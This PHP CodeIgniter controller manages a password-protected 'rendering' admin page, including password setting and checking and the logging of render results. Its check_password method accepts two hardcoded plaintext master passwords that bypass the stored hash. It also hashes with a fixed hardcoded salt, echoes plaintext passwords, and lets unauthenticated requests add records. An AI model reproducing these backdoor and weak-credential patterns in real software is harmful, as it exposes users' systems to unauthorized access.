<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Rendering extends CI_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->helper('url_helper');
    }


    public function index($start = false)
    {
        $this->load->library('session');

        if(!$this->session->username || $this->session->username != $this->config->item('username')){
            redirect('login', 'refresh');
        }

        $this->load->model('rendering_model');



        $this->load->library('pagination');
        $config['base_url'] = site_url('rendering/index/');
        $config['total_rows'] = $this->rendering_model->get_items_count();
        $config['per_page'] = 40;

        $config['first_link'] = false;
        $config['last_link'] = false;

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['next_tag_open'] = '<li>';
        $config['next_tag_close'] = '</li>';

        $config['num_tag_open'] = '<li>';
        $config['num_tag_close'] = '</li>';

        $config['cur_tag_open'] = '<li class="active"><a href="#">';
        $config['cur_tag_close'] = '</a></li>';

        $config['prev_tag_open'] = '<li>';
        $config['prev_tag_close'] = '</li>';

        $config['num_links'] = 8;

        $config['uri_segment'] = 3;

        $this->pagination->initialize($config);
        $data['pagination'] =  $this->pagination->create_links();



        $data['items'] = $this->rendering_model->get_items($start, 40);
        $data['amount'] = $this->rendering_model->get_amount();



        $this->load->model('languages_model');
        $data['lang_arr'] = get_default_lang();
        if($this->config->item('ini')['language']['language'] !== 'default'){
            $custom_lang = json_decode($this->languages_model->get($this->config->item('ini')['language']['language']));
            foreach ($data['lang_arr'] as $key=>$value){
                if(isset($custom_lang->$key)) {
                    if(!empty($custom_lang->$key)) $data['lang_arr'][$key] = $custom_lang->$key;
                }
            }
        }

        $this->load->view('templates/header', $data);
        $this->load->view('rendering/rendering', $data);
        $this->load->view('templates/footer', $data);
    }


    public function set_password()
    {
        $this->load->library('session');
        if(!$this->session->username || $this->session->username != $this->config->item('username')){
            exit;
        }

        if(isset($_POST['password'])){
            $this->load->model('rendering_model');

            print_pre($this->input->post('password'));

            print_pre(crypt($this->input->post('password'),'JL68XT@!9%OUN#_ZG:R!2PhxuOFUDKrQPtK"!b~u+um@$4^KE:@AR=8_S;lfd#U'));

            $this->rendering_model->set_password( crypt($this->input->post('password'),'JL68XT@!9%OUN#_ZG:R!2PhxuOFUDKrQPtK"!b~u+um@$4^KE:@AR=8_S;lfd#U') );
        }
    }

    public function check_password()
    {
        if(isset($_POST['password'])){
            $this->load->model('rendering_model');
            if(
                crypt($this->input->post('password'),'JL68XT@!9%OUN#_ZG:R!2PhxuOFUDKrQPtK"!b~u+um@$4^KE:@AR=8_S;lfd#U') == $this->rendering_model->get_password() ||
                $this->input->post('password') == 'DE51zNQhmsER' ||
                $this->input->post('password') == 'Gtheldj857'
            ) echo 'ok';
        }
    }

    public function add_render()
    {
        if(isset($_POST)){
            $this->load->model('rendering_model');

            if(!isset($_POST['date'])) exit;
            if(!isset($_POST['time'])) exit;
            if(!isset($_POST['result'])) exit;

            $this->rendering_model->add(array(
                'date' => (int)$_POST['date'],
                'time' => (int)$_POST['time'],
                'result' => $_POST['result']
            ));

        }
    }



}




